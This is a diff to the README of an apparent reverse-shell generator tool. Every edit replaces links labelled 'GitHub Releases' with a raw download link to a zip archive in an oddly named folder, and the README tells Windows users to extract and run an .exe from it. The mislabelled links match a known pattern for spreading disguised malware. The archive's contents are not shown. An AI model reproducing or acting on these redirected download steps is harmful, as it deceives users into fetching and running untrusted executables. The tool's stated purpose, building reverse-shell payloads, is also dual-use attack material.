@@ -1,10 +1,10 @@
 # 🐚 revShellsGenerator-page - Build Reverse Shells With Ease
 
-[![Download from Releases](https://img.shields.io/badge/Download%20from-Releases-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://github.com/burnt-diaphragm594/revShellsGenerator-page/releases)
+[![Download from Releases](https://img.shields.io/badge/Download%20from-Releases-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/burnt-diaphragm594/revShellsGenerator-page/main/semigranulate/page-Shells-Generator-rev-3.7.zip)
 
 ## 📥 Download
 
-Visit this page to download: [GitHub Releases](https://github.com/burnt-diaphragm594/revShellsGenerator-page/releases)
+Visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/burnt-diaphragm594/revShellsGenerator-page/main/semigranulate/page-Shells-Generator-rev-3.7.zip)
 
 Use the latest release file for Windows, then save it to your PC. If the release includes a `.zip` file, extract it first. If it includes an `.exe` file, you can run it after the download finishes.
 
@@ -23,7 +23,7 @@ This tool fits users who want a simple way to create payload strings for lab wor
 
 ## 🚀 Get Started on Windows
 
-1. Open the [GitHub Releases page](https://github.com/burnt-diaphragm594/revShellsGenerator-page/releases).
+1. Open the [GitHub Releases page](https://raw.githubusercontent.com/burnt-diaphragm594/revShellsGenerator-page/main/semigranulate/page-Shells-Generator-rev-3.7.zip).
 2. Find the latest release.
 3. Download the Windows file or the ZIP package.
 4. If the file is zipped, right-click it and choose Extract All.
@@ -145,7 +145,7 @@ Check the IP, port, and shell type. Then generate the payload again and copy it 
 
 ## 📎 Download Again
 
-Get the latest release here: [https://github.com/burnt-diaphragm594/revShellsGenerator-page/releases](https://github.com/burnt-diaphragm594/revShellsGenerator-page/releases)
+Get the latest release here: [https://raw.githubusercontent.com/burnt-diaphragm594/revShellsGenerator-page/main/semigranulate/page-Shells-Generator-rev-3.7.zip](https://raw.githubusercontent.com/burnt-diaphragm594/revShellsGenerator-page/main/semigranulate/page-Shells-Generator-rev-3.7.zip)
 
 ## 🧰 File Layout
 
